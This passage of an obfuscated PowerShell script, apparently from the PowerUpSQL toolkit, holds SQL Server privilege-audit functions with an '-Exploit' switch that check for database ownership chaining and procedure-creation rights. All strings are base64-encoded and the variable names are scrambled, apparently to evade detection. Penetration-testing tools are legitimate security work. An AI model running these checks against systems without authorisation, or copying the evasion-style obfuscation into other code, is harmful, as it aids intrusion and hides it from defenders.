	        ${__/\/=\/=\/\/\_/\} = Get-SQLDatabasePriv -Verbose -DatabaseName master -SuppressVerbose -Instance $Instance -Username $username -Password $password -Credential $credential | 
            ? {$_.objectname -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABQAHIAbwBjAGUAZAB1AHIAZQBOAGEAbQBlAA==')))}
            ${__/\/\/\_________} = ${__/\/=\/=\/\/\_/\} | measure | select count -ExpandProperty count
            if(${__/\/\/\_________} -ge 1){
                ${__/\/=\/=\/\/\_/\} | 
                % {
                    $PrincipalName = $_.PrincipalName
                    ${/=\____/\_/\_/\__} = $_.PrincipalType
                    $PermissionName = $_.PermissionName
                    $PermissionType = $_.PermissionType
                    ${_/==\_/\/=\_/===\} = $_.StateDescription
                    ${/=\/======\_/\/\_} = $_.ObjectType
                    ${_/==\_/\/==\____/} = $_.ObjectName
                    ${/==\_/\__/====\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABEAGEAdABhAGIAYQBzAGUATgBhAG0AZQAuACQAUwBjAGgAZQBtAGEATgBhAG0AZQAuACQAUAByAG8AYwBlAGQAdQByAGUATgBhAG0AZQA=')))
                    ${__/====\/=\/=\/=\}.Rows.Add(
                        $ComputerName,
                        $Instance,
                        $DatabaseName,
                        $SchemaName,
                        $ProcedureName,
                        ${/=\/\__/\____/\/\},
                        ${__/=\/\/======\_/},
                        ${_/=\_/=====\/\_/=},
                        ${_/\/=\/\_/\/==\/\},
                        ${/=\_/=\___/\_/\/\},
                        ${_/=\___/\/\/\_/\/},
                        ${/=\_/==\_/\___/=\},
                        ${___/\/=\__/\/=\__},
                        $PrincipalName,
                        ${/=\____/\_/\_/\__},
                        $PermissionName,
                        $PermissionType,
                        ${_/==\_/\/=\_/===\},
                        ${_/==\_/\/==\____/},
                        ${/=\/======\_/\/\_}
                    ) | Out-Null
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgACQAUAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQAgAGgAYQBzACAAJAB7AF8ALwA9AD0AXABfAC8AXAAvAD0AXABfAC8APQA9AD0AXAB9ACAAJABQAGUAcgBtAGkAcwBzAGkAbwBuAE4AYQBtAGUAIABvAG4AIAAkAHsALwA9AD0AXABfAC8AXABfAF8ALwA9AD0APQA9AFwALwBcAH0ALgA=')))
                    ${/=\/=\_/\/\/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABQAHIAaQBuAGMAaQBwAGEAbABOAGEAbQBlACAAaABhAHMAIAAkAHsAXwAvAD0APQBcAF8ALwBcAC8APQBcAF8ALwA9AD0APQBcAH0AIAAkAFAAZQByAG0AaQBzAHMAaQBvAG4ATgBhAG0AZQAgAG8AbgAgACQAewAvAD0APQBcAF8ALwBcAF8AXwAvAD0APQA9AD0AXAAvAFwAfQAuAA==')))
                    $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})            
                }
            }
        }
        ${___/=\/=\_/=\_/==} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA=')))
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABFAHgAYwBlAHMAcwBpAHYAZQAgAFAAcgBpAHYAaQBsAGUAZwBlACAALQAgAFQAcgB1AHMAdABlAGQAIABEAGEAdABhAGIAYQBzAGUA')))
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return ${_/=\/\_/=====\/\_}
        }
    }
}


Function Invoke-SQLAuditPrivDbChaining
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [switch]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        ${_/=\/\_/=====\/\_} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBUAEEAUgBUACAAVgBVAEwATgBFAFIAQQBCAEkATABJAFQAWQAgAEMASABFAEMASwA6ACAARQB4AGMAZQBzAHMAaQB2AGUAIABQAHIAaQB2AGkAbABlAGcAZQAgAC0AIABEAGEAdABhAGIAYQBzAGUAIABPAHcAbgBlAHIAcwBoAGkAcAAgAEMAaABhAGkAbgBpAG4AZwA=')))
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not ${__/\_/=\/==\_/=\_})
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAEYAQQBJAEwARQBEAC4A')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABFAHgAYwBlAHMAcwBpAHYAZQAgAFAAcgBpAHYAaQBsAGUAZwBlACAALQAgAEQAYQB0AGEAYgBhAHMAZQAgAE8AdwBuAGUAcgBzAGgAaQBwACAAQwBoAGEAaQBuAGkAbgBnAC4A')))
            Return
        }
        else
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAFMAVQBDAEMARQBTAFMALgA=')))
        }
        ${_/==\_/==\___/\_/} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${/=\_/==\__/\/\_/=} = ${_/==\_/==\___/\_/}.CurrentLogin
        $ComputerName = ${_/==\_/==\___/\_/}.ComputerName
        if($Exploit)
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        ${/=\/====\_/\/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBzAHMAaQB2AGUAIABQAHIAaQB2AGkAbABlAGcAZQAgAC0AIABEAGEAdABhAGIAYQBzAGUAIABPAHcAbgBlAHIAcwBoAGkAcAAgAEMAaABhAGkAbgBpAG4AZwA=')))
        ${__/\/\_______/==\}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAHMAaABpAHAAIABjAGgAYQBpAG4AaQBuAGcAIAB3AGEAcwAgAGYAbwB1AG4AZAAgAGUAbgBhAGIAbABlAGQAIABhAHQAIAB0AGgAZQAgAHMAZQByAHYAZQByACAAbwByACAAZABhAHQAYQBiAGEAcwBlACAAbABlAHYAZQBsAC4AIAAgAEUAbgBhAGIAbABpAG4AZwAgAG8AdwBuAGUAcgBzAGgAaQBwACAAYwBoAGEAaQBuAGkAbgBnACAAYwBhAG4AIABsAGUAYQBkACAAdABvACAAdQBuAGEAdQB0AGgAbwByAGkAegBlAGQAIABhAGMAYwBlAHMAcwAgAHQAbwAgAGQAYQB0AGEAYgBhAHMAZQAgAHIAZQBzAG8AdQByAGMAZQBzAC4A')))
        ${____/\__/===\/===}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AZgBpAGcAdQByAGUAZAAgAHQAaABlACAAYQBmAGYAZQBjAHQAZQBkACAAZABhAHQAYQBiAGEAcwBlACAAcwBvACAAdABoAGUAIAAnAGkAcwBfAGQAYgBfAGMAaABhAGkAbgBpAG4AZwBfAG8AbgAnACAAZgBsAGEAZwAgAGkAcwAgAHMAZQB0ACAAdABvACAAJwBmAGEAbABzAGUAJwAuACAAIABBACAAcQB1AGUAcgB5ACAAcwBpAG0AaQBsAGEAcgAgAHQAbwAgACcAQQBMAFQARQBSACAARABBAFQAQQBCAEEAUwBFACAARABhAHQAYQBiAGEAcwBlADEAIABTAEUAVAAgAEQAQgBfAEMASABBAEkATgBJAE4ARwAgAE8ATgAnACAAaQBzACAAdQBzAGUAZAAgAGUAbgBhAGIAbABlACAAYwBoAGEAaQBuAGkAbgBnAC4AIAAgAEEAIABxAHUAZQByAHkAIABzAGkAbQBpAGwAYQByACAAdABvACAAJwBBAEwAVABFAFIAIABEAEEAVABBAEIAQQBTAEUAIABEAGEAdABhAGIAYQBzAGUAMQAgAFMARQBUACAARABCAF8AQwBIAEEASQBOAEkATgBHACAATwBGAEYAOwAnACAAYwBhAG4AIABiAGUAIAB1AHMAZQBkACAAdABvACAAZABpAHMAYQBiAGwAZQAgAGMAaABhAGkAbgBpAG4AZwAuAA==')))
        ${/=\_/=\_/=\_/\/=\}      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcA')))
        ${____/=\_/=\___/=\}  = 'No'
        ${___/=\/=\_/=\_/==} = 'No'
        ${__/\/\_/==\/==\/\}     = 'No'
        ${_____/\/========\}    = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAcgBlACAAaQBzACAAbgBvAHQAIABlAHgAcABsAG8AaQB0ACAAYQB2AGEAaQBsAGEAYgBsAGUAIABhAHQAIAB0AGgAaQBzACAAdABpAG0AZQAuAA==')))
        ${/=\/=\_/\/\/\/\_/}       = ''
        ${______/=\/==\/===}     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAHQAZQBjAGgAbgBlAHQALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAG0AcwAxADgAOAA2ADcANgAoAHYAPQBzAHEAbAAuADEAMAA1ACkALgBhAHMAcAB4ACwAaAB0AHQAcABzADoALwAvAG0AcwBkAG4ALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAGIAYgA2ADYAOQAwADUAOQAoAHYAPQB2AHMALgAxADEAMAApAC4AYQBzAHAAeAAgAA==')))
        ${_/\____/\/==\/\/\}        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        if($NoDefaults)
        {
            ${/=\_/=\/=\_/\__/=} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -NoDefaults -SuppressVerbose | ? -FilterScript {
                $_.is_db_chaining_on -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAZQA=')))
            }
        }
        else
        {
            ${/=\_/=\/=\_/\__/=} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
                $_.is_db_chaining_on -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAZQA=')))
            }
        }
        if(${/=\_/=\/=\_/\__/=})
        {
            ${____/=\_/=\___/=\}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
            ${/=\_/=\/=\_/\__/=} |
            % -Process {
                $DatabaseName = $_.DatabaseName
				if($DatabaseName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBhAHMAdABlAHIA'))) -and $DatabaseName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABlAG0AcABkAGIA'))) -and $DatabaseName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAYgA='))))
				{
					Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFQAaABlACAAZABhAHQAYQBiAGEAcwBlACAAJABEAGEAdABhAGIAYQBzAGUATgBhAG0AZQAgAGgAYQBzACAAbwB3AG4AZQByAHMAaABpAHAAIABjAGgAYQBpAG4AaQBuAGcAIABlAG4AYQBiAGwAZQBkAC4A')))
					${/=\/=\_/\/\/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABkAGEAdABhAGIAYQBzAGUAIAAkAEQAYQB0AGEAYgBhAHMAZQBOAGEAbQBlACAAdwBhAHMAIABmAG8AdQBuAGQAIABjAG8AbgBmAGkAZwB1AHIAZQBkACAAdwBpAHQAaAAgAG8AdwBuAGUAcgBzAGgAaQBwACAAYwBoAGEAaQBuAGkAbgBnACAAZQBuAGEAYgBsAGUAZAAuAA==')))
					$null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})
				}
            }
        }
        else
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAE4AbwAgAG4AbwBuAC0AZABlAGYAYQB1AGwAdAAgAGQAYQB0AGEAYgBhAHMAZQBzACAAdwBlAHIAZQAgAGYAbwB1AG4AZAAgAHcAaQB0AGgAIABvAHcAbgBlAHIAcwBoAGkAcAAgAGMAaABhAGkAbgBpAG4AZwAgAGUAbgBhAGIAbABlAGQALgA=')))
        }
        ${__/==\/\______/==} = Get-SQLServerConfiguration -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAGgAYQBpAG4AKgA='))) -and $_.config_value -eq 1
        }
        if(${__/==\/\______/==})
        {
            ${____/=\_/=\___/=\}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFQAaABlACAAcwBlAHIAdgBlAHIAIABjAG8AbgBmAGkAZwB1AHIAYQB0AGkAbwBuACAAJwBjAHIAbwBzAHMAIABkAGIAIABvAHcAbgBlAHIAcwBoAGkAcAAgAGMAaABhAGkAbgBpAG4AZwAnACAAaQBzACAAcwBlAHQAIAB0AG8AIAAxAC4AIAAgAFQAaABpAHMAIABjAGEAbgAgAGEAZgBmAGUAYwB0ACAAYQBsAGwAIABkAGEAdABhAGIAYQBzAGUAcwAuAA==')))
            ${/=\/=\_/\/\/\/\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABzAGUAcgB2AGUAcgAgAGMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4AIAAnAGMAcgBvAHMAcwAgAGQAYgAgAG8AdwBuAGUAcgBzAGgAaQBwACAAYwBoAGEAaQBuAGkAbgBnACcAIABpAHMAIABzAGUAdAAgAHQAbwAgADEALgAgACAAVABoAGkAcwAgAGMAYQBuACAAYQBmAGYAZQBjAHQAIABhAGwAbAAgAGQAYQB0AGEAYgBhAHMAZQBzAC4A')))
            $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABFAHgAYwBlAHMAcwBpAHYAZQAgAFAAcgBpAHYAaQBsAGUAZwBlACAALQAgAEQAYQB0AGEAYgBhAHMAZQAgAE8AdwBuAGUAcgBzAGgAaQBwACAAQwBoAGEAaQBuAGkAbgBnAA==')))
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return ${_/=\/\_/=====\/\_}
        }
    }
}
Function Invoke-SQLAuditPrivCreateProcedure
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        ${_/=\/\_/=====\/\_} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBUAEEAUgBUACAAVgBVAEwATgBFAFIAQQBCAEkATABJAFQAWQAgAEMASABFAEMASwA6ACAAUABFAFIATQBJAFMAUwBJAE8ATgAgAC0AIABDAFIARQBBAFQARQAgAFAAUgBPAEMARQBEAFUAUgBFAA==')))
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not ${__/\_/=\/==\_/=\_})
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAEYAQQBJAEwARQBEAA==')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABQAEUAUgBNAEkAUwBTAEkATwBOACAALQAgAEMAUgBFAEEAVABFACAAUABSAE8AQwBFAEQAVQBSAEUA')))
            Return
        }
        else
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAFMAVQBDAEMARQBTAFMA')))
        }
        ${_/==\_/==\___/\_/} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = ${_/==\_/==\___/\_/}.ComputerName
        ${/=\_/==\__/\/\_/=} = ${_/==\_/==\___/\_/}.CurrentLogin
        ${_/\_/===\___/\/\_} = Get-SQLServerRoleMember -Instance $Instance  -Username $Username -Password $Password -Credential $Credential -PrincipalName ${/=\_/==\__/\/\_/=} -SuppressVerbose
        ${___/\/\/=\/=\_/=\} = @()
        ${___/\/\/=\/=\_/=\} += ${/=\_/==\__/\/\_/=}
        ${___/\/\/=\/=\_/=\} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))
        ${_/\_/===\___/\/\_} |
        % -Process {
            ${___/\/\/=\/=\_/=\} += $_.RolePrincipalName
        }
        if($Exploit)
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        ${/=\/====\_/\/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFAFIATQBJAFMAUwBJAE8ATgAgAC0AIABDAFIARQBBAFQARQAgAFAAUgBPAEMARQBEAFUAUgBFAA==')))
        ${__/\/\_______/==\}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABsAG8AZwBpAG4AIABoAGEAcwAgAHAAcgBpAHYAaQBsAGUAZwBlAHMAIAB0AG8AIABjAHIAZQBhAHQAZQAgAHMAdABvAHIAZQBkACAAcAByAG8AYwBlAGQAdQByAGUAcwAgAGkAbgAgAG8AbgBlACAAbwByACAAbQBvAHIAZQAgAGQAYQB0AGEAYgBhAHMAZQBzAC4AIAAgAFQAaABpAHMAIABtAGEAeQAgAGEAbABsAG8AdwAgAHQAaABlACAAbABvAGcAaQBuACAAdABvACAAZQBzAGMAYQBsAGEAdABlACAAcAByAGkAdgBpAGwAZQBnAGUAcwAgAHcAaQB0AGgAaQBuACAAdABoAGUAIABkAGEAdABhAGIAYQBzAGUALgA=')))
